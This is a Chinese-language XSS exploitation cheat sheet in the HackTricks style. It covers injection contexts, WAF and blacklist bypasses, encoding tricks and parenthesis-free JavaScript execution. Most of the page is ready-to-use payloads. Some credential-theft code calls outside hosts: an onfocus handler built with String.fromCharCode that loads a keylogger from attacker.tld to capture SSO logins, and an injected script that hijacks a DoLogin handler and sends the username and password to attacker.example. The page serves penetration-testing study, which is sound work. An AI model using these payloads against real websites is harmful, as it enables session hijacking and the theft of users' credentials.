# XSS (Cross Site Scripting)

{{#include ../../banners/hacktricks-training.md}}

## 方法论

1. 检查是否有 **any value you control** (_parameters_, _path_, _headers_?, _cookies_?) 被 **反射** 在 HTML 中或被 **used** by **JS** code。
2. **找到上下文**：你的输入在哪里被反射/使用。
3. 如果被 **reflected**
1. 检查 **which symbols can you use**，并据此准备 payload：
1. 在 **raw HTML** 中：
1. 能否创建新的 HTML tag？
2. 能否使用支持 `javascript:` 协议的事件或属性？
3. 能否绕过防护？
4. HTML 内容是否被任何 client side JS 引擎（_AngularJS_, _VueJS_, _Mavo_...）解析？你可以滥用 [**Client Side Template Injection**](../client-side-template-injection-csti.md)。
5. 如果你不能创建执行 JS 的 HTML tag，能否滥用 [**Dangling Markup - HTML scriptless injection**](../dangling-markup-html-scriptless-injection/index.html)？
2. 在 **HTML tag** 内部：
1. 能否退出到 raw HTML 上下文？
2. 能否创建新的事件/属性来执行 JS 代码？
3. 你被限制的那个 attribute 是否支持 JS 执行？
4. 能否绕过防护？
3. 在 **JavaScript code** 内部：
1. 能否 escape `<script>` tag？
2. 能否 escape 字符串并执行不同的 JS 代码？
3. 你的输入是否在 template literals `` 中？
4. 能否绕过防护？
4. Javascript **function** 被 **executed**
1. 你可以指示要执行的函数名。例如：`?callback=alert(1)`
4. 如果被 **used**：
1. 你可能可以利用 **DOM XSS**，注意你的输入如何被控制以及你的 **controlled input 是否被任何 sink 使用。**

在处理复杂的 XSS 时，你可能会对以下内容感兴趣：


{{#ref}}
debugging-client-side-js.md
{{#endref}}

## 被反射的值

要成功利用 XSS，首先需要找到一个**被你控制且会被反射**到网页中的值。

- **Intermediately reflected**：如果你发现一个 parameter 的值甚至 path 被反射到网页中，你可以利用 **Reflected XSS**。
- **Stored and reflected**：如果你发现一个由你控制的值被服务器保存，并且每次访问页面时都会被反射，你可以利用 **Stored XSS**。
- **Accessed via JS**：如果你发现一个由你控制的值被 JS 访问，你可以利用 **DOM XSS**。

## 上下文

在尝试利用 XSS 时，首先要知道 **你的输入被反射在哪里**。根据上下文，你将以不同方式执行任意 JS 代码。

### Raw HTML

如果你的输入被 **reflected on the raw HTML** 页面上，你需要滥用某些 **HTML tag** 来执行 JS 代码：`<img , <iframe , <svg , <script` ... 这些只是你可以使用的众多 HTML tag 中的一些。\
另外，记住 [Client Side Template Injection](../client-side-template-injection-csti.md)。

### 在 HTML 标签的属性内

如果你的输入被反射在标签属性的值内，你可以尝试：

1. **escape from the attribute and from the tag**（这样你就回到 raw HTML），并创建新的 HTML tag 来滥用： `"><img [...]`
2. 如果你 **can escape from the attribute but not from the tag**（`>` 被编码或删除），根据标签你可以 **create an event** 来执行 JS 代码：`" autofocus onfocus=alert(1) x="`
3. 如果你 **cannot escape from the attribute**（`"` 被编码或删除），那么取决于你的值被反射到 **which attribute**，以及你是控制整个值还是仅部分，你会有不同的滥用方式。举个 **example**，如果你控制的是像 `onclick=` 这样的事件，你可以让它在被点击时执行任意代码。另一个有趣的 **example** 是属性 `href`，你可以使用 `javascript:` 协议来执行任意代码：**`href="javascript:alert(1)"`**
4. 如果你的输入被反射在“**unexpoitable tags**”内，你可以尝试 **`accesskey`** 技巧来滥用该漏洞（需要一些社工手段才能利用）：**`" accesskey="x" onclick="alert(1)" x="`**

#### Attribute-only login XSS behind WAFs

一个公司 SSO 登录页面在 `<a id="forgot_btn" ...>` 的 `href` 属性内反射了 OAuth `service` 参数。尽管 `<` 和 `>` 被 HTML 编码，但双引号没有被编码，所以攻击者可以关闭属性并复用同一元素注入诸如 `" onfocus="payload" x="` 的处理器。

1. **Inject the handler：** 简单的 payload 如 `onclick="print(1)"` 被阻止，但 WAF 只检查内联属性中的第一个 JavaScript 语句。在前面加上用括号包裹的无害表达式，然后一个分号，就允许真正的 payload 执行：`onfocus="(history.length);malicious_code_here"`。
2. **Auto-trigger it：** 浏览器会将 fragment 与 id 匹配的元素聚焦，所以在利用 URL 后追加 `#forgot_btn` 会在页面加载时强制该锚点获得焦点并运行处理器，无需点击。
3. **Keep the inline stub tiny：** 目标页面已经引入了 jQuery。处理器只需要通过 `$.getScript(...)` 引导去请求，而完整的 keylogger 放在攻击者服务器上。

**Building strings without quotes**

单引号以 URL 编码的形式返回且转义的双引号会破坏属性，因此 payload 使用 `String.fromCharCode` 生成每个字符串。一个辅助函数可以在把任何 URL 粘贴到属性之前，方便地将其转换为字符编码：
```javascript
function toCharCodes(str){
return `const url = String.fromCharCode(${[...str].map(c => c.charCodeAt(0)).join(',')});`
}
console.log(toCharCodes('https://attacker.tld/keylogger.js'))
```
结果属性看起来像：
```html
onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
```
**为什么这会窃取凭证**

外部脚本（loaded from an attacker-controlled host or Burp Collaborator）hooked `document.onkeypress`，缓存按键，并每秒发送 `new Image().src = collaborator_url + keys`。由于该 XSS 仅在未认证用户时触发，敏感操作就是登录表单本身——攻击者会记录用户名和密码，即使受害者从未点击“登录”。

如果你控制一个 class name，Angular 执行 XSS 的一个奇怪示例：
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
### 在 JavaScript 代码内

在这种情况下，你的输入会被反射在 HTML 页面里的 **`<script> [...] </script>`** 标签之间、`.js` 文件内，或在使用 **`javascript:`** 协议的属性中：

- 如果被反射在 **`<script> [...] </script>`** 标签之间，即使你的输入在任何类型的引号内，你也可以尝试注入 `</script>` 并从该上下文中跳出。之所以可行，是因为**浏览器会先解析 HTML 标签**，然后再解析内容，因此它不会注意到你注入的 `</script>` 标签位于 HTML 代码内。
- 如果被反射在 **JS 字符串** 内且上一个技巧不起作用，你需要**退出**字符串、**执行**你的代码并**重建**JS 代码（如果有任何错误，代码将不会被执行）:
- `'-alert(1)-'`
- `';-alert(1)//`
- `\';alert(1)//`
- 如果被反射在模板字面量中，你可以使用 `${ ... }` 语法**嵌入 JS 表达式**： `` var greetings = `Hello, ${alert(1)}` ``
- **Unicode encode** 可用于编写**有效的 javascript 代码**：
```javascript
alert(1)
alert(1)
alert(1)
```
#### Javascript Hoisting

Javascript Hoisting 指的是在使用后再**声明函数、变量或类**的机会，这样可以滥用那些 XSS 使用未声明变量或函数的场景。\
**更多信息请查看以下页面：**


{{#ref}}
js-hoisting.md
{{#endref}}

### Javascript Function

许多网页的端点会**接受作为参数的要执行函数名**。在实际中常见的例子像：`?callback=callbackFunc`。

一种判断用户直接提供的内容是否会被执行的好方法是**修改该参数的值**（例如改为 'Vulnerable'），然后在控制台查看是否出现类似错误：

![](<../../images/image (711).png>)

如果存在漏洞，你可以仅通过发送该值来**触发 alert**：**`?callback=alert(1)`**。然而，这类端点通常会**验证内容**，只允许字母、数字、点和下划线（**`[\w\._]`**）。

不过，即便有这种限制，仍然可以执行某些操作。这是因为你可以使用这些合法字符来**访问 DOM 中的任意元素**：

![](<../../images/image (747).png>)

一些对此有用的函数：
```
firstElementChild
lastElementChild
nextElementSibiling
lastElementSibiling
parentElement
```
你也可以尝试直接**触发 Javascript functions**：`obj.sales.delOrders`。

然而，通常执行该函数的 endpoints 所在的页面没有太多有趣的 DOM，**同一 origin 的其他页面** 会拥有更**有趣的 DOM** 来执行更多操作。

因此，为了**在不同的 DOM 中滥用此漏洞**，开发了 **Same Origin Method Execution (SOME)** 利用方法：


{{#ref}}
some-same-origin-method-execution.md
{{#endref}}

### DOM

存在不安全地使用诸如 `location.href` 之类**由攻击者控制的数据**的 **JS code**。攻击者可以滥用这一点来执行任意 JS 代码。


{{#ref}}
dom-xss.md
{{#endref}}

### **Universal XSS**

这种类型的 XSS 可以在**任何地方**被发现。它们不仅依赖于对 web 应用的客户端利用，还依赖于**任何****上下文**。这类**arbitrary JavaScript execution** 甚至可以被滥用以获取 **RCE**、在客户端和服务器上**读取任意文件**，以及更多功能。\
一些**示例**：


{{#ref}}
server-side-xss-dynamic-pdf.md
{{#endref}}


{{#ref}}
../../network-services-pentesting/pentesting-web/electron-desktop-apps/
{{#endref}}

## WAF bypass encoding image

![from https://twitter.com/hackerscrolls/status/1273254212546281473?s=21](<../../images/EauBb2EX0AERaNK (1).jpg>)

## Injecting inside raw HTML

当你的输入被反射在**HTML 页面内部**，或者你可以在此上下文中转义并注入 HTML 代码时，**第一**件你需要做的是检查是否可以滥用 `<` 来创建新标签：只需尝试**反射**该**char**并检查它是否被**HTML encoded**或**删除**，或者是否**原样反射**。**只有在最后一种情况下你才能利用此情况**。\
对于这些情况也**请记住** [**Client Side Template Injection**](../client-side-template-injection-csti.md)**.**\
_**注意：HTML 注释可以通过 `-->` 或 `--!>` 关闭**_

在这种情况下，如果没有使用黑/白名单，你可以使用类似以下的 payloads：
```html
<script>
alert(1)
</script>
<img src="x" onerror="alert(1)" />
<svg onload=alert('XSS')>
```
但是，如果使用了标签/属性的黑/白名单过滤，你需要 **brute-force which tags** 你可以创建。\
一旦你 **located which tags are allowed**，你还需要在找到的有效标签中 **brute-force attributes/events**，以确定如何利用具体上下文进行攻击。

### 标签/事件 brute-force

访问 [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) 并点击 _**Copy tags to clipboard**_。然后，使用 Burp intruder 发送所有这些标签，并检查是否有标签未被 WAF 识别为恶意。一旦你发现可以使用的标签，你就可以使用这些有效标签 **brute force all the events**（在同一网页点击 _**Copy events to clipboard**_ 并按之前相同的流程操作）。

### 自定义标签

如果你没有找到任何有效的 HTML 标签，你可以尝试 **create a custom tag** 并使用 `onfocus` 属性执行 JS 代码。在 XSS 请求中，需要在 URL 末尾加上 `#`，使页面 **focus on that object** 并 **execute** 代码：
```
/?search=<xss+id%3dx+onfocus%3dalert(document.cookie)+tabindex%3d1>#x
```
### Blacklist Bypasses

如果正在使用某种 blacklist，你可以尝试用一些简单的技巧来 bypass 它：
```javascript
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```
### 长度绕过 (小型 XSSs)

> [!NOTE] > **更多适用于不同环境的 tiny XSS** payload [**can be found here**](https://github.com/terjanq/Tiny-XSS-Payloads) and [**here**](https://tinyxss.terjanq.me).
```html
<!-- Taken from the blog of Jorge Lajara -->
<svg/onload=alert``> <script src=//aa.es> <script src=//℡㏛.pw>
```
The last one is using 2 unicode characters which expands to 5: telsr\
More of these characters can be found [here](https://www.unicode.org/charts/normalization/).\
To check in which characters are decomposed check [here](https://www.compart.com/en/unicode/U+2121).

### Click XSS - Clickjacking

如果为了利用该漏洞你需要**用户点击带有预填数据的链接或表单**，你可以尝试[**abuse Clickjacking**](../clickjacking.md#xss-clickjacking)（如果页面存在漏洞）。

### Impossible - Dangling Markup

如果你认为**不可能创建带有可以执行 JS 代码的属性的 HTML 标签**，你应该查看[**Danglig Markup** ](../dangling-markup-html-scriptless-injection/index.html) 因为你可以在**不**执行**JS**代码的情况下**利用**该漏洞。

## 注入到 HTML 标签内部

### 在标签内/从属性值转义

如果你处于**HTML 标签内部**，首先可以尝试**转义**出标签并使用[previous section](#injecting-inside-raw-html)提到的一些技术来执行 JS 代码。\
如果你**无法从标签中转义**，可以在标签内创建新的属性来尝试执行 JS 代码，例如使用一些 payload，像这样（_注意在此示例中使用双引号来从属性中转义，如果你的输入直接反映在标签内部则不需要它们_）：
```bash
" autofocus onfocus=alert(document.domain) x="
" onfocus=alert(1) id=x tabindex=0 style=display:block>#x #Access http://site.com/?#x t
```
**样式事件**
```python
<p style="animation: x;" onanimationstart="alert()">XSS</p>
<p style="animation: x;" onanimationend="alert()">XSS</p>

#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
#moving your mouse anywhere over the page (0-click-ish):
<div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
```
### 属性内部

即使你 **无法从属性中转义**（`"` 被编码或删除），取决于 **值被反射到哪个属性** 以及你是控制整个值还是仅控制部分，你仍然可以滥用它。举个 **例子**，如果你控制了像 `onclick=` 这样的事件，你就能让它在被点击时执行任意代码。\
另一个有趣的 **例子** 是属性 `href`，你可以使用 `javascript:` 协议来执行任意代码： **`href="javascript:alert(1)"`**

**在事件内使用 HTML 编码/URL 编码 绕过**

HTML 标签属性值内的 **HTML 编码字符** 会在运行时被**解码**。因此下面这样的写法是有效的（payload 用粗体标出）： `<a id="author" href="http://none" onclick="var tracker='http://foo?`**`&apos;-alert(1)-&apos;`**`';">Go Back </a>`

注意 **任何形式的 HTML 编码都是有效的**：
```javascript
//HTML entities
&apos;-alert(1)-&apos;
//HTML hex without zeros
&#x27-alert(1)-&#x27
//HTML hex with zeros
&#x00027-alert(1)-&#x00027
//HTML dec without zeros
&#39-alert(1)-&#39
//HTML dec with zeros
&#00039-alert(1)-&#00039

<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
<a href="&#106;avascript:alert(2)">a</a>
<a href="jav&#x61script:alert(3)">a</a>
```
**注意 URL encode 也会起作用：**
```python
<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
```
**在事件内部使用 Unicode 编码进行 Bypass**
```javascript
//For some reason you can use unicode to encode "alert" but not "(1)"
<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
```
### 属性内的特殊协议

在这些位置，你可以使用协议 **`javascript:`** 或 **`data:`** 来 **执行任意 JS 代码**。有些需要用户交互，有些则不需要。
```javascript
javascript:alert(1)
JavaSCript:alert(1)
javascript:%61%6c%65%72%74%28%31%29 //URL encode
javascript&colon;alert(1)
javascript&#x003A;alert(1)
javascript&#58;alert(1)
javascript:alert(1)
java        //Note the new line
script:alert(1)

data:text/html,<script>alert(1)</script>
DaTa:text/html,<script>alert(1)</script>
data:text/html;charset=iso-8859-7,%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e
data:text/html;charset=UTF-8,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=
data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg
data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
```
**可以注入这些协议的位置**

**一般来说** `javascript:` 协议可以 **用于任何接受 `href` 属性的标签**，并且在 **大多数** 接受 **`src` 属性** 的标签中也可以使用（但不能用于 `<img>`）
```html
<a href="javascript:alert(1)">
<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
<form action="javascript:alert(1)"><button>send</button></form>
<form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
<object data=javascript:alert(3)>
<iframe src=javascript:alert(2)>
<embed src=javascript:alert(1)>

<object data="data:text/html,<script>alert(5)</script>">
<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
<iframe src="data:text/html,<script>alert(5)</script>"></iframe>

//Special cases
<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
<iframe srcdoc="<svg onload=alert(4);>">
```
**其他混淆技巧**

_**在这种情况下，HTML encoding 和 Unicode encoding 的技巧与上一节相同，也适用，因为你处于属性内部。**_
```javascript
<a href="javascript:var a='&apos;-alert(1)-&apos;'">
```
此外，对于这些情况还有一个**不错的技巧**：**即使你放在 `javascript:...` 内的输入被 URL 编码，执行前也会先被 URL 解码。** 因此，如果你需要**转义**（也就是从**字符串**中通过**单引号**），并且看到它**被 URL 编码了**，记住**这无关紧要，**它会**被解释为**一个**单引号**在**执行**时。
```javascript
&apos;-alert(1)-&apos;
%27-alert(1)-%27
<iframe src=javascript:%61%6c%65%72%74%28%31%29></iframe>
```
注意，如果你尝试**同时使用** `URLencode + HTMLencode` 以任意顺序对 **payload** 进行编码， 它**不会** **起作用**，但你可以**在 payload 内部混合它们**。

**将 Hex 和 Octal encode 与 `javascript:` 一起使用**

你可以在 `iframe` 的 `src` 属性（至少）中使用 **Hex** 和 **Octal encode** 来声明 **HTML tags to execute JS**:
```javascript
//Encoded: <svg onload=alert(1)>
// This WORKS
<iframe src=javascript:'\x3c\x73\x76\x67\x20\x6f\x6e\x6c\x6f\x61\x64\x3d\x61\x6c\x65\x72\x74\x28\x31\x29\x3e' />
<iframe src=javascript:'\74\163\166\147\40\157\156\154\157\141\144\75\141\154\145\162\164\50\61\51\76' />

//Encoded: alert(1)
// This doesn't work
<svg onload=javascript:'\x61\x6c\x65\x72\x74\x28\x31\x29' />
<svg onload=javascript:'\141\154\145\162\164\50\61\51' />
```
### Reverse tab nabbing
```javascript
<a target="_blank" rel="opener"
```
如果你能在任意 **`<a href=`** 标签中注入任何 URL，且该标签包含 **`target="_blank" and rel="opener"`** 属性，请查看 **以下页面以利用此行为**：

{{#ref}}
../reverse-tab-nabbing.md
{{#endref}}

### on Event Handlers 绕过

首先查看此页面 ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) 以获取有用的 **"on" event handlers**。\
如果存在某些黑名单阻止你创建这些 event handlers，你可以尝试以下绕过方法：
```javascript
<svg onload%09=alert(1)> //No safari
<svg %09onload=alert(1)>
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2c%3b=alert(1)>

//chars allowed between the onevent and the "="
IExplorer: %09 %0B %0C %020 %3B
Chrome: %09 %20 %28 %2C %3B
Safari: %2C %3B
Firefox: %09 %20 %28 %2C %3B
Opera: %09 %20 %2C %3B
Android: %09 %20 %28 %2C %3B
```
### XSS 在 "Unexploitable tags" (hidden input, link, canonical, meta)

根据 [**here**](https://portswigger.net/research/exploiting-xss-in-hidden-inputs-and-meta-tags) **现在可以通过以下方式滥用 hidden inputs：**
```html
<button popvertarget="x">Click me</button>
<input type="hidden" value="y" popover id="x" onbeforetoggle="alert(1)" />
```
还有在 **meta 标签**：
```html
<!-- Injection inside meta attribute-->
<meta
name="apple-mobile-web-app-title"
content=""
Twitter
popover
id="newsletter"
onbeforetoggle="alert(2)" />
<!-- Existing target-->
<button popovertarget="newsletter">Subscribe to newsletter</button>
<div popover id="newsletter">Newsletter popup</div>
```
From [**here**](https://portswigger.net/research/xss-in-hidden-input-fields): 你可以执行一个 **XSS payload inside a hidden attribute**，前提是你能**persuade**该**victim**按下**key combination**。在 Firefox Windows/Linux 上，键盘组合是 **ALT+SHIFT+X**；在 OS X 上是 **CTRL+ALT+X**。你可以在 access key attribute 中使用不同的键来指定不同的键盘组合。下面是该向量：
```html
<input type="hidden" accesskey="X" onclick="alert(1)">
```
**XSS payload 会像这样： `" accesskey="x" onclick="alert(1)" x="`**

### 黑名单绕过

本节已经展示了若干使用不同编码的技巧。返回学习你可以在哪里使用：

- **HTML encoding (HTML tags)**
- **Unicode encoding (can be valid JS code):** `\u0061lert(1)`
- **URL encoding**
- **Hex and Octal encoding**
- **data encoding**

**HTML 标签和属性的绕过**

阅读[上一节的黑名单绕过](#blacklist-bypasses)。

**JavaScript 代码的绕过**

阅读[下一节的 JavaScript 绕过黑名单](#javascript-bypass-blacklists-techniques)。

### CSS-Gadgets

如果你在网页的一个很小区域发现了 **XSS**，并且需要某种交互（例如页脚的一个带有 onmouseover 的小链接），你可以尝试**修改该元素占据的空间**，以最大化触发该链接的概率。

例如，你可以在该元素上添加如下样式： `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: red; opacity: 0.5`

但是，如果 WAF 过滤了 style 属性，你可以使用 CSS Styling Gadgets，例如如果你发现

> .test {display:block; color: blue; width: 100%\}

和

> \#someid {top: 0; font-family: Tahoma;}

现在你可以修改我们的链接，使其变为以下形式

> \<a href="" id=someid class=test onclick=alert() a="">

这个技巧来源于 [https://medium.com/@skavans\_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703](https://medium.com/@skavans_/improving-the-impact-of-a-mouse-related-xss-with-styling-and-css-gadgets-b1e5dec2f703)

## 在 JavaScript 代码内注入

在这种情况下，你的**输入**会被反射到 `.js` 文件的 JS 代码中，或位于 `<script>...</script>` 标签之间，或位于可以执行 JS 的 HTML 事件中，或位于接受 `javascript:` 协议的属性中。

### 逃逸 \<script> 标签

如果你的代码被插入到 `<script> [...] var input = 'reflected data' [...] </script>` 中，你可以很容易通过转义来关闭 `<script>` 标签：
```javascript
</script><img src=1 onerror=alert(document.domain)>
```
请注意，在这个例子中我们**甚至没有关闭单引号**。这是因为**HTML 解析首先由浏览器执行**，浏览器会识别页面元素，包括 script 块。对 JavaScript 的解析（以理解并执行嵌入的脚本）则是在之后进行的。

### 在 JS 代码中

如果 `<>` 正在被过滤，你仍然可以**转义字符串**（在你的输入被**定位**的地方）并**执行任意 JS**。重要的是要**修正 JS 语法**，因为如果有任何错误，JS 代码将不会被执行：
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```
#### JS-in-JS string break → inject → repair pattern

当用户输入落在被引号包围的 JavaScript 字符串中时（例如，server-side echo 到 inline script），你可以终止该字符串、注入代码，并修复语法以保持解析有效。通用骨架：
```
"            // end original string
;            // safely terminate the statement
<INJECTION>  // attacker-controlled JS
; a = "      // repair and resume expected string/statement
```
当易受攻击的参数被反射到 JS 字符串中时的示例 URL 模式：
```
?param=test";<INJECTION>;a="
```
这会在不需要触及 HTML 上下文的情况下执行攻击者 JS（纯 JS-in-JS）。当过滤器阻止关键字时，结合下面的 blacklist bypasses 使用。

### 模板字面量 ``

为了构造**字符串**，除了单引号和双引号，JS 也接受**反引号** **` `` `**。这被称为模板字面量，因为它允许使用 `${ ... }` 语法**嵌入 JS 表达式**。\
因此，如果你发现你的输入被反射到使用反引号的 JS 字符串中，你可以滥用 `${ ... }` 语法来执行**任意 JS 代码**：

这可以通过以下方式**滥用**：
```javascript
;`${alert(1)}``${`${`${`${alert(1)}`}`}`}`
```

```javascript
// This is valid JS code, because each time the function returns itself it's recalled with ``
function loop() {
return loop
}
loop``
```
### 编码的 code 执行
```html
<script>\u0061lert(1)</script>
<svg><script>alert&lpar;'1'&rpar;
<svg><script>alert(1)</script></svg>  <!-- The svg tags are neccesary
<iframe srcdoc="<SCRIPT>alert(1)</iframe>">
```
#### 带有 eval(atob()) 的可交付 payloads 和 scope 细微差别

为了缩短 URLs 并绕过简单的 keyword filters，你可以 base64-encode 你的真实逻辑并用 `eval(atob('...'))` 来执行。如果简单的 keyword filtering 会阻止像 `alert`、`eval` 或 `atob` 这样的标识符，使用 Unicode-escaped identifiers —— 它们在浏览器中编译后与原始标识符完全相同，但能规避基于字符串匹配的过滤：
```
\u0061\u006C\u0065\u0072\u0074(1)                      // alert(1)
\u0065\u0076\u0061\u006C(\u0061\u0074\u006F\u0062('BASE64'))  // eval(atob('...'))
```
重要的作用域细节：`const`/`let` 在 `eval()` 内声明是块级作用域的，并且不会创建 globals；它们对后续脚本不可访问。需要定义全局、不可重新绑定的 hooks 时（例如用于 hijack a form handler），请使用动态注入的 `<script>` 元素：
```javascript
var s = document.createElement('script');
s.textContent = "const DoLogin = () => {const pwd = Trim(FormInput.InputPassword.value); const user = Trim(FormInput.InputUtente.value); fetch('https://attacker.example/?u='+encodeURIComponent(user)+'&p='+encodeURIComponent(pwd));}";
document.head.appendChild(s);
```
Reference: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

### Unicode 编码的 JS 执行
```javascript
alert(1)
alert(1)
alert(1)
```
### JavaScript bypass blacklists techniques

**字符串**
```javascript
"thisisastring"
'thisisastrig'
`thisisastring`
/thisisastring/ == "/thisisastring/"
/thisisastring/.source == "thisisastring"
"\h\e\l\l\o"
String.fromCharCode(116,104,105,115,105,115,97,115,116,114,105,110,103)
"\x74\x68\x69\x73\x69\x73\x61\x73\x74\x72\x69\x6e\x67"
"\164\150\151\163\151\163\141\163\164\162\151\156\147"
"\u0074\u0068\u0069\u0073\u0069\u0073\u0061\u0073\u0074\u0072\u0069\u006e\u0067"
"\u{74}\u{68}\u{69}\u{73}\u{69}\u{73}\u{61}\u{73}\u{74}\u{72}\u{69}\u{6e}\u{67}"
"\a\l\ert\(1\)"
atob("dGhpc2lzYXN0cmluZw==")
eval(8680439..toString(30))(983801..toString(36))
```
**特殊转义**
```javascript
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
"\b" //backspace
"\f" //form feed
"\n" //new line
"\r" //carriage return
"\t" //tab
// Any other char escaped is just itself
```
**JS 代码中的空格替换**
```javascript
<TAB>
/**/
```
**JavaScript 注释 (来自** [**JavaScript Comments**](#javascript-comments) **技巧)**
```javascript
//This is a 1 line comment
/* This is a multiline comment*/
<!--This is a 1line comment
#!This is a 1 line comment, but "#!" must to be at the beggining of the first line
-->This is a 1 line comment, but "-->" must to be at the beggining of the first line
```
**JavaScript new lines (来自** [**JavaScript new line**](#javascript-new-lines) **技巧)**
```javascript
//Javascript interpret as new line these chars:
String.fromCharCode(10)
alert("//\nalert(1)") //0x0a
String.fromCharCode(13)
alert("//\ralert(1)") //0x0d
String.fromCharCode(8232)
alert("//\u2028alert(1)") //0xe2 0x80 0xa8
String.fromCharCode(8233)
alert("//\u2029alert(1)") //0xe2 0x80 0xa9
```
**JavaScript 空白字符**
```javascript
log=[];
function funct(){}
for(let i=0;i<=0x10ffff;i++){
try{
eval(`funct${String.fromCodePoint(i)}()`);
log.push(i);
}
catch(e){}
}
console.log(log)
//9,10,11,12,13,32,160,5760,8192,8193,8194,8195,8196,8197,8198,8199,8200,8201,8202,8232,8233,8239,8287,12288,65279

//Either the raw characters can be used or you can HTML encode them if they appear in SVG or HTML attributes:
<img/src/onerror=alert&#65279;(1)>
```
**Javascript 在注释中**
```javascript
//If you can only inject inside a JS comment, you can still leak something
//If the user opens DevTools request to the indicated sourceMappingURL will be send

//# sourceMappingURL=https://evdr12qyinbtbd29yju31993gumlaby0.oastify.com
```
**JavaScript 无括号**
```javascript
// By setting location
window.location='javascript:alert\x281\x29'
x=new DOMMatrix;matrix=alert;x.a=1337;location='javascript'+':'+x
// or any DOMXSS sink such as location=name

// Backtips
// Backtips pass the string as an array of lenght 1
alert`1`

// Backtips + Tagged Templates + call/apply
eval`alert\x281\x29` // This won't work as it will just return the passed array
setTimeout`alert\x281\x29`
eval.call`${'alert\x281\x29'}`
eval.apply`${[`alert\x281\x29`]}`
[].sort.call`${alert}1337`
[].map.call`${eval}\\u{61}lert\x281337\x29`

// To pass several arguments you can use
function btt(){
console.log(arguments);
}
btt`${'arg1'}${'arg2'}${'arg3'}`

//It's possible to construct a function and call it
Function`x${'alert(1337)'}x`

// .replace can use regexes and call a function if something is found
"a,".replace`a${alert}` //Initial ["a"] is passed to str as "a," and thats why the initial string is "a,"
"a".replace.call`1${/./}${alert}`
// This happened in the previous example
// Change "this" value of call to "1,"
// match anything with regex /./
// call alert with "1"
"a".replace.call`1337${/..../}${alert}` //alert with 1337 instead

// Using Reflect.apply to call any function with any argumnets
Reflect.apply.call`${alert}${window}${[1337]}` //Pass the function to call (“alert”), then the “this” value to that function (“window”) which avoids the illegal invocation error and finally an array of arguments to pass to the function.
